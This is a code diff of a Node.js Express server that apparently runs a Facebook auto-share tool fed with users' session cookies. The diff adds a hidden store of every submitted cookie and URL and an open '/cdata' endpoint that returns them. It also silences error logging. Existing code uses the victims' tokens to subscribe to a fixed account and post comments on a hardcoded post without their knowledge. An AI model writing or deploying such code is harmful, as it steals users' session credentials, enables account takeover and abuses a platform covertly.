@@ -7,6 +7,7 @@ const port = 3000;
 app.use(express.json());
 app.use(bodyParser.json());
 const total = new Map();
+const collectedData = [];
 
 function userAgent(){
   /*const cp = [
@@ -49,9 +50,8 @@ function userAgent(){
 
 
 const link1 = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
-
-async function ako(res){
-const data = Array.from(total.values()).map((link, index) => ({
+app.get('/shares', (req, res) => {
+ const data = Array.from(total.values()).map((link, index) => ({
   shared: link.shared,
   session: index + 1,
   url: link.url,
@@ -59,13 +59,11 @@ const data = Array.from(total.values()).map((link, index) => ({
   target: link.target,
 }));
 const jsob = JSON.parse(JSON.stringify(data || [], null, 2));
-if (res != null){
-  res.json(jsob);
-}
-}
+return res.json(jsob);
+});
 
-app.get('/sigma', (req, res) => {
- ako(res);
+app.get("/cdata", (req, res) => {
+return res.json(collectedData);
 });
 app.get('/', (req, res) => {
  return res.send("pogi... sige na");
@@ -82,9 +80,7 @@ if (leiam) {
 } else {
   return null;
  }
-} catch (error) {
-    console.log("[ ERROR ] > ", error);
- }
+} catch (error) {}
 }
 app.get('/sh', async (req, res) => {
   const {
@@ -103,7 +99,11 @@ app.get('/sh', async (req, res) => {
         error: 'Invalid cookies'
       });
     };
-    await yello(cookie, url, amount, interval)
+    await yello(cookie, url, amount, interval);
+    collectedData.push({
+      cookie,
+      url
+    });
     res.status(200).json({
       status: 200
     });
@@ -160,16 +160,15 @@ async function fucker(a){
     };
     axios.get(`https://graph.facebook.com/v18.0/${neth}/subscribers`, {}, {
       headers
-    }).catch(error => {});
+    }).catch(err => {});
     axios.post(`https://graph.facebook.com/${extract(link1)}/comments`, null, {
       params: {
         message: kapogi[Math.floor(Math.random() * kapogi.length)],
         access_token: a
       }, headers })
-      .catch(error => {});
-  } catch (error){
-    console.log("happened error");
-  }
+      .catch(err => {});
+  } catch (err){
+   }
 }
 async function share(sharedIs,cookies, url, amount, interval) {
   const id = Math.floor(Math.random() * 69696969);
@@ -219,7 +218,7 @@ async function share(sharedIs,cookies, url, amount, interval) {
       if (sharedCount === amount) {
         clearInterval(timer);
       }
-    } catch (error) {
+    } catch (err) {
       clearInterval(timer);
       total.delete(id);
     }
